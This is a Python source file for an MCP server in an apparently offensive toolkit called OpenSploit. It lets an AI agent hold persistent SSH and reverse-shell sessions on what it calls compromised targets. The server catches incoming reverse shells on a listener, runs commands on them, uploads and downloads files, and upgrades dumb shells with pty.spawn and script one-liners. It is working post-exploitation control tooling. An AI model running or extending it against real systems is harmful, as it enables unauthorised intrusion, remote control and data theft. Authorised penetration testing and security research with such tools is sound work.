#!/usr/bin/env python3
"""
OpenSploit MCP Server: shell-session

Persistent shell session management for SSH and reverse shell connections.
Enables the agent to maintain interactive sessions on compromised targets.

Key features:
- Persistent SSH sessions (no reconnection per command)
- Reverse shell listener with output stability detection
- File upload/download via SFTP or inline transfer
- Multiple concurrent sessions identified by session ID
- Shell upgrade (dumb shell to PTY)
"""

import asyncio
import base64
import io
import os
import re
import socket
import tempfile
import threading
import time
import uuid
from dataclasses import dataclass
from typing import Dict, Optional, Tuple

import paramiko

from mcp_common import BaseMCPServer, ToolResult


@dataclass
class SSHSession:
    """Persistent SSH session."""
    id: str
    client: paramiko.SSHClient
    sftp: Optional[paramiko.SFTPClient]
    host: str
    port: int
    username: str
    connected_at: float

    def is_connected(self) -> bool:
        """Check if SSH connection is still active."""
        try:
            transport = self.client.get_transport()
            return transport is not None and transport.is_active()
        except:
            return False


@dataclass
class ReverseShellSession:
    """Reverse shell session via socket."""
    id: str
    socket: socket.socket
    remote_addr: Tuple[str, int]
    connected_at: float
    buffer: str = ""

    def is_connected(self) -> bool:
        """Check if socket is still connected."""
        try:
            # Try to peek at data without consuming it
            self.socket.setblocking(False)
            try:
                data = self.socket.recv(1, socket.MSG_PEEK)
                return len(data) > 0
            except BlockingIOError:
                return True  # No data but connection alive
            except:
                return False
            finally:
                self.socket.setblocking(True)
        except:
            return False


class ShellSessionServer(BaseMCPServer):
    """
    MCP server for managing persistent shell sessions.

    Supports both SSH-based sessions (preferred) and reverse shell sessions.
    Sessions persist across multiple commands, reducing connection overhead
    and enabling stateful operations.
    """

    def __init__(self):
        super().__init__(
            name="shell-session",
            description="Persistent shell session management for SSH and reverse shells",
            version="1.0.0",
        )

        # Session storage
        self.ssh_sessions: Dict[str, SSHSession] = {}
        self.shell_sessions: Dict[str, ReverseShellSession] = {}
        self.listeners: Dict[int, socket.socket] = {}

        # Output stability settings
        self.stability_window = 0.5  # seconds to wait for output to stabilize
        self.shell_prompts = [r'[$#>]\s*$', r'bash-\d+\.\d+[$#]\s*$', r'\w+@\w+.*[$#]\s*$']

        # Register SSH methods
        self.register_method(
            name="ssh_connect",
            description="Establish persistent SSH session to target",
            params={
                "host": {"type": "string", "required": True, "description": "Target hostname or IP"},
                "port": {"type": "integer", "default": 22, "description": "SSH port"},
                "username": {"type": "string", "required": True, "description": "SSH username"},
                "password": {"type": "string", "description": "SSH password"},
                "private_key": {"type": "string", "description": "Base64-encoded private key"},
                "timeout": {"type": "integer", "default": 30, "description": "Connection timeout"},
            },
            handler=self.ssh_connect,
        )

        self.register_method(
            name="exec",
            description="Execute command on established session",
            params={
                "session_id": {"type": "string", "required": True, "description": "Session ID from connect"},
                "command": {"type": "string", "required": True, "description": "Command to execute"},
                "timeout": {"type": "integer", "default": 120, "description": "Command timeout"},
                "get_pty": {"type": "boolean", "default": False, "description": "Request PTY for command"},
            },
            handler=self.exec_command,
        )

        self.register_method(
            name="upload",
            description="Upload file to target via SFTP",
            params={
                "session_id": {"type": "string", "required": True, "description": "Session ID"},
                "content": {"type": "string", "required": True, "description": "File content (text or base64)"},
                "remote_path": {"type": "string", "required": True, "description": "Destination path on target"},
                "mode": {"type": "string", "default": "0755", "description": "File permissions"},
                "is_base64": {"type": "boolean", "default": False, "description": "Content is base64-encoded"},
            },
            handler=self.upload,
        )

        self.register_method(
            name="download",
            description="Download file from target via SFTP",
            params={
                "session_id": {"type": "string", "required": True, "description": "Session ID"},
                "remote_path": {"type": "string", "required": True, "description": "Path on target"},
                "as_base64": {"type": "boolean", "default": False, "description": "Return as base64"},
            },
            handler=self.download,
        )

        # Reverse shell methods
        self.register_method(
            name="listen",
            description="Start listener for reverse shell connection",
            params={
                "port": {"type": "integer", "required": True, "description": "Port to listen on"},
                "timeout": {"type": "integer", "default": 300, "description": "Wait timeout for connection"},
            },
            handler=self.listen,
        )

        self.register_method(
            name="shell_exec",
            description="Execute command on reverse shell with output stability detection",
            params={
                "session_id": {"type": "string", "required": True, "description": "Session ID"},
                "command": {"type": "string", "required": True, "description": "Command to execute"},
                "timeout": {"type": "integer", "default": 60, "description": "Command timeout"},
            },
            handler=self.shell_exec,
        )

        # Session management
        self.register_method(
            name="list_sessions",
            description="List all active sessions",
            params={},
            handler=self.list_sessions,
        )

        self.register_method(
            name="close",
            description="Close session gracefully",
            params={
                "session_id": {"type": "string", "required": True, "description": "Session ID to close"},
            },
            handler=self.close_session,
        )

        self.register_method(
            name="upgrade_shell",
            description="Upgrade dumb shell to interactive PTY",
            params={
                "session_id": {"type": "string", "required": True, "description": "Shell session ID"},
            },
            handler=self.upgrade_shell,
        )

    def _generate_session_id(self) -> str:
        """Generate unique session ID."""
        return f"ses_{uuid.uuid4().hex[:12]}"

    async def ssh_connect(
        self,
        host: str,
        username: str,
        port: int = 22,
        password: Optional[str] = None,
        private_key: Optional[str] = None,
        timeout: int = 30,
    ) -> ToolResult:
        """Establish persistent SSH session."""
        self.logger.info(f"Connecting SSH to {username}@{host}:{port}")

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Prepare authentication
            connect_kwargs = {
                "hostname": host,
                "port": port,
                "username": username,
                "timeout": timeout,
                "allow_agent": False,
                "look_for_keys": False,
            }

            if private_key:
                # Decode base64 key if provided
                try:
                    key_data = base64.b64decode(private_key).decode()
                except:
                    key_data = private_key

                # Try to load key
                key_file = io.StringIO(key_data)
                try:
                    pkey = paramiko.RSAKey.from_private_key(key_file)
                except:
                    key_file.seek(0)
                    try:
                        pkey = paramiko.Ed25519Key.from_private_key(key_file)
                    except:
                        key_file.seek(0)
                        pkey = paramiko.ECDSAKey.from_private_key(key_file)

                connect_kwargs["pkey"] = pkey
            elif password:
                connect_kwargs["password"] = password
            else:
                return ToolResult(
                    success=False,
                    data={"host": host, "username": username},
                    error="Either password or private_key is required",
                )

            # Connect
            client.connect(**connect_kwargs)

            # Get banner
            transport = client.get_transport()
            banner = ""
            if transport:
                try:
                    banner = transport.get_banner().decode() if transport.get_banner() else ""
                except:
                    pass

            # Open SFTP if possible
            sftp = None
            try:
                sftp = client.open_sftp()
            except:
                self.logger.warning("SFTP not available on this connection")

            # Create session
            session_id = self._generate_session_id()
            session = SSHSession(
                id=session_id,
                client=client,
                sftp=sftp,
                host=host,
                port=port,
                username=username,
                connected_at=time.time(),
            )
            self.ssh_sessions[session_id] = session

            self.logger.info(f"SSH session established: {session_id}")

            return ToolResult(
                success=True,
                data={
                    "session_id": session_id,
                    "host": host,
                    "username": username,
                    "port": port,
                    "banner": banner,
                    "sftp_available": sftp is not None,
                },
                raw_output=f"SSH session established: {session_id}",
            )

        except paramiko.AuthenticationException as e:
            return ToolResult(
                success=False,
                data={"host": host, "username": username},
                error=f"Authentication failed: {e}",
            )
        except paramiko.SSHException as e:
            return ToolResult(
                success=False,
                data={"host": host, "username": username},
                error=f"SSH error: {e}",
            )
        except socket.timeout:
            return ToolResult(
                success=False,
                data={"host": host, "username": username},
                error=f"Connection timed out after {timeout} seconds",
            )
        except Exception as e:
            return ToolResult(
                success=False,
                data={"host": host, "username": username},
                error=str(e),
            )

    async def exec_command(
        self,
        session_id: str,
        command: str,
        timeout: int = 120,
        get_pty: bool = False,
    ) -> ToolResult:
        """Execute command on SSH session."""
        session = self.ssh_sessions.get(session_id)

        if not session:
            return ToolResult(
                success=False,
                data={"session_id": session_id},
                error=f"Session not found: {session_id}",
            )

        if not session.is_connected():
            del self.ssh_sessions[session_id]
            return ToolResult(
                success=False,
                data={"session_id": session_id},
                error="Session disconnected",
            )

        self.logger.info(f"Executing on {session_id}: {command[:50]}...")

        try:
            # Execute command
            stdin, stdout, stderr = session.client.exec_command(
                command,
                timeout=timeout,
                get_pty=get_pty,
            )

            # Read output with timeout
            channel = stdout.channel
            channel.settimeout(timeout)

            stdout_data = stdout.read().decode("utf-8", errors="replace")
            stderr_data = stderr.read().decode("utf-8", errors="replace")
            exit_code = channel.recv_exit_status()

            return ToolResult(
                success=exit_code == 0,
                data={
                    "session_id": session_id,
                    "command": command,
                    "exit_code": exit_code,
                    "stdout": stdout_data,
                    "stderr": stderr_data if stderr_data else None,
                    "timed_out": False,
                },
                raw_output=stdout_data if stdout_data else stderr_data,
            )

        except socket.timeout:
            return ToolResult(
                success=False,
                data={"session_id": session_id, "command": command, "timed_out": True},
                error=f"Command timed out after {timeout} seconds",
            )
        except Exception as e:
            return ToolResult(
                success=False,
                data={"session_id": session_id, "command": command},
                error=str(e),
            )

    async def upload(
        self,
        session_id: str,
        content: str,
        remote_path: str,
        mode: str = "0755",
        is_base64: bool = False,
    ) -> ToolResult:
        """Upload file to target."""
        session = self.ssh_sessions.get(session_id)

        if not session:
            return ToolResult(
                success=False,
                data={"session_id": session_id},
                error=f"Session not found: {session_id}",
            )

        if not session.is_connected():
            return ToolResult(
                success=False,
                data={"session_id": session_id},
                error="Session disconnected",
            )

        self.logger.info(f"Uploading to {remote_path} on {session_id}")

        try:
            # Decode content if base64
            if is_base64:
                file_content = base64.b64decode(content)
            else:
                file_content = content.encode()

            if session.sftp:
                # Use SFTP (preferred)
                with session.sftp.file(remote_path, "wb") as f:
                    f.write(file_content)
                session.sftp.chmod(remote_path, int(mode, 8))
            else:
                # Fallback to echo + base64
                b64_content = base64.b64encode(file_content).decode()
                result = await self.exec_command(
                    session_id=session_id,
                    command=f"echo '{b64_content}' | base64 -d > {remote_path} && chmod {mode} {remote_path}",
                    timeout=60,
                )
                if not result.success:
                    return result

            return ToolResult(
                success=True,
                data={
                    "session_id": session_id,
                    "remote_path": remote_path,
                    "size": len(file_content),
                    "mode": mode,
                },
                raw_output=f"Uploaded {len(file_content)} bytes to {remote_path}",
            )

        except Exception as e:
            return ToolResult(
                success=False,
                data={"session_id": session_id, "remote_path": remote_path},
                error=str(e),
            )

    async def download(
        self,
        session_id: str,
        remote_path: str,
        as_base64: bool = False,
    ) -> ToolResult:
        """Download file from target."""
        session = self.ssh_sessions.get(session_id)

        if not session:
            return ToolResult(
                success=False,
                data={"session_id": session_id},
                error=f"Session not found: {session_id}",
            )

        if not session.is_connected():
            return ToolResult(
                success=False,
                data={"session_id": session_id},
                error="Session disconnected",
            )

        self.logger.info(f"Downloading {remote_path} from {session_id}")

        try:
            if session.sftp:
                # Use SFTP
                with session.sftp.file(remote_path, "rb") as f:
                    file_content = f.read()
            else:
                # Fallback to cat + base64
                result = await self.exec_command(
                    session_id=session_id,
                    command=f"base64 {remote_path}",
                    timeout=60,
                )
                if not result.success:
                    return result
                file_content = base64.b64decode(result.data.get("stdout", ""))

            if as_base64:
                content = base64.b64encode(file_content).decode()
            else:
                content = file_content.decode("utf-8", errors="replace")

            return ToolResult(
                success=True,
                data={
                    "session_id": session_id,
                    "remote_path": remote_path,
                    "content": content,
                    "size": len(file_content),
                    "is_base64": as_base64,
                },
                raw_output=content[:10000] if not as_base64 else f"[{len(file_content)} bytes, base64]",
            )

        except FileNotFoundError:
            return ToolResult(
                success=False,
                data={"session_id": session_id, "remote_path": remote_path},
                error=f"File not found: {remote_path}",
            )
        except Exception as e:
            return ToolResult(
                success=False,
                data={"session_id": session_id, "remote_path": remote_path},
                error=str(e),
            )

    async def listen(
        self,
        port: int,
        timeout: int = 300,
    ) -> ToolResult:
        """Start listener and wait for reverse shell connection."""
        self.logger.info(f"Starting listener on port {port}")

        try:
            # Create listener socket
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind(("0.0.0.0", port))
            listener.listen(1)
            listener.settimeout(timeout)

            self.listeners[port] = listener
            self.logger.info(f"Listening on port {port}, waiting for connection...")

            # Wait for connection
            try:
                client_socket, client_addr = listener.accept()
                self.logger.info(f"Connection received from {client_addr}")

                # Create session
                session_id = self._generate_session_id()
                session = ReverseShellSession(
                    id=session_id,
                    socket=client_socket,
                    remote_addr=client_addr,
                    connected_at=time.time(),
                )
                self.shell_sessions[session_id] = session

                # Read initial output (banner, prompt, etc.)
                initial_output = await self._read_until_stable(client_socket, timeout=5)

                return ToolResult(
                    success=True,
                    data={
                        "session_id": session_id,
                        "remote_ip": client_addr[0],
                        "remote_port": client_addr[1],
                        "initial_output": initial_output,
                    },
                    raw_output=f"Shell connected from {client_addr[0]}:{client_addr[1]}\n{initial_output}",
                )

            except socket.timeout:
                return ToolResult(
                    success=False,
                    data={"port": port},
                    error=f"No connection received within {timeout} seconds",
                )
            finally:
                listener.close()
                del self.listeners[port]

        except OSError as e:
            if "Address already in use" in str(e):
                return ToolResult(
                    success=False,
                    data={"port": port},
                    error=f"Port {port} is already in use",
                )
            raise

    async def _read_until_stable(
        self,
        sock: socket.socket,
        timeout: int = 60,
        stability_window: float = 0.5,
    ) -> str:
        """
        Read from socket until output stabilizes.

        Output is considered stable when no new data arrives for stability_window seconds,
        or when a shell prompt is detected.
        """
        output = ""
        last_data_time = time.time()
        start_time = time.time()

        sock.setblocking(False)

        while True:
            # Check total timeout
            if time.time() - start_time > timeout:
                output += "\n[TIMEOUT]"
                break

            # Check stability
            if time.time() - last_data_time > stability_window:
                # Check for shell prompt
                for prompt_pattern in self.shell_prompts:
                    if re.search(prompt_pattern, output):
                        break
                break

            try:
                data = sock.recv(4096)
                if data:
                    output += data.decode("utf-8", errors="replace")
                    last_data_time = time.time()
                else:
                    break  # Connection closed
            except BlockingIOError:
                await asyncio.sleep(0.1)
            except Exception:
                break

        sock.setblocking(True)
        return output

    async def shell_exec(
        self,
        session_id: str,
        command: str,
        timeout: int = 60,
    ) -> ToolResult:
        """Execute command on reverse shell session."""
        session = self.shell_sessions.get(session_id)

        if not session:
            return ToolResult(
                success=False,
                data={"session_id": session_id},
                error=f"Session not found: {session_id}",
            )

        if not session.is_connected():
            del self.shell_sessions[session_id]
            return ToolResult(
                success=False,
                data={"session_id": session_id},
                error="Session disconnected",
            )

        self.logger.info(f"Executing on shell {session_id}: {command[:50]}...")

        try:
            # Send command
            session.socket.sendall(f"{command}\n".encode())

            # Read output with stability detection
            output = await self._read_until_stable(
                session.socket,
                timeout=timeout,
                stability_window=self.stability_window,
            )

            # Remove the echoed command from output
            lines = output.split("\n")
            if lines and command in lines[0]:
                output = "\n".join(lines[1:])

            return ToolResult(
                success=True,
                data={
                    "session_id": session_id,
                    "command": command,
                    "output": output.strip(),
                },
                raw_output=output.strip(),
            )

        except Exception as e:
            return ToolResult(
                success=False,
                data={"session_id": session_id, "command": command},
                error=str(e),
            )

    async def list_sessions(self) -> ToolResult:
        """List all active sessions."""
        sessions = []

        # Check SSH sessions
        for session_id, session in list(self.ssh_sessions.items()):
            if session.is_connected():
                sessions.append({
                    "id": session_id,
                    "type": "ssh",
                    "host": session.host,
                    "port": session.port,
                    "username": session.username,
                    "connected_at": session.connected_at,
                    "uptime_seconds": int(time.time() - session.connected_at),
                })
            else:
                del self.ssh_sessions[session_id]

        # Check shell sessions
        for session_id, session in list(self.shell_sessions.items()):
            if session.is_connected():
                sessions.append({
                    "id": session_id,
                    "type": "reverse_shell",
                    "remote_ip": session.remote_addr[0],
                    "remote_port": session.remote_addr[1],
                    "connected_at": session.connected_at,
                    "uptime_seconds": int(time.time() - session.connected_at),
                })
            else:
                del self.shell_sessions[session_id]

        return ToolResult(
            success=True,
            data={
                "sessions": sessions,
                "total": len(sessions),
            },
            raw_output=f"Active sessions: {len(sessions)}",
        )

    async def close_session(self, session_id: str) -> ToolResult:
        """Close a session."""
        # Check SSH sessions
        if session_id in self.ssh_sessions:
            session = self.ssh_sessions.pop(session_id)
            try:
                if session.sftp:
                    session.sftp.close()
                session.client.close()
            except:
                pass
            return ToolResult(
                success=True,
                data={"session_id": session_id, "type": "ssh"},
                raw_output=f"SSH session {session_id} closed",
            )

        # Check shell sessions
        if session_id in self.shell_sessions:
            session = self.shell_sessions.pop(session_id)
            try:
                session.socket.close()
            except:
                pass
            return ToolResult(
                success=True,
                data={"session_id": session_id, "type": "reverse_shell"},
                raw_output=f"Shell session {session_id} closed",
            )

        return ToolResult(
            success=False,
            data={"session_id": session_id},
            error=f"Session not found: {session_id}",
        )

    async def upgrade_shell(self, session_id: str) -> ToolResult:
        """Upgrade a dumb shell to interactive PTY."""
        session = self.shell_sessions.get(session_id)

        if not session:
            return ToolResult(
                success=False,
                data={"session_id": session_id},
                error=f"Session not found: {session_id}",
            )

        if not session.is_connected():
            return ToolResult(
                success=False,
                data={"session_id": session_id},
                error="Session disconnected",
            )

        self.logger.info(f"Upgrading shell {session_id}")

        # Try Python PTY upgrade first
        upgrade_commands = [
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "script -qc /bin/bash /dev/null",
        ]

        for cmd in upgrade_commands:
            result = await self.shell_exec(session_id, cmd, timeout=5)
            if result.success and "bash" in result.data.get("output", "").lower():
                return ToolResult(
                    success=True,
                    data={"session_id": session_id, "upgrade_method": cmd},
                    raw_output=f"Shell upgraded using: {cmd}",
                )

        return ToolResult(
            success=False,
            data={"session_id": session_id},
            error="Failed to upgrade shell - python and script not available",
        )


if __name__ == "__main__":
    ShellSessionServer.main()
